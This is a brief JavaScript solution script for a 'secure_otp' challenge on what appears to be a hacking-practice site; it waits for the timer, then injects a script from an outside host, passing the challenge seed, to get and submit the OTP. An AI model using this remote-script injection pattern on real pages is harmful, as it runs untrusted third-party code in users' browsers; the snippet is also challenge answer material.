(function( challenge_id = "secure_otp" ){

    runSolution( { challenge_id, solution } );

    async function solution( tag ){
        window.solution_secure_otp = function(otp){
            tag.refs.answer.value = otp;
            tag.submit({});
        }
        while( !/Time Remaining/.test(tag.refs.challengeContent.innerText) ){
            await sleep(100);
        }
        document.head.appendChild(document.createElement("script")).src = "https://fockjef.net/canyouhackit/secure_otp.py?seed=" + tag.challenge.seed;
    }

    function sleep( ms ){
        return new Promise( resolve => setTimeout( resolve, ms ) );
    }
})();
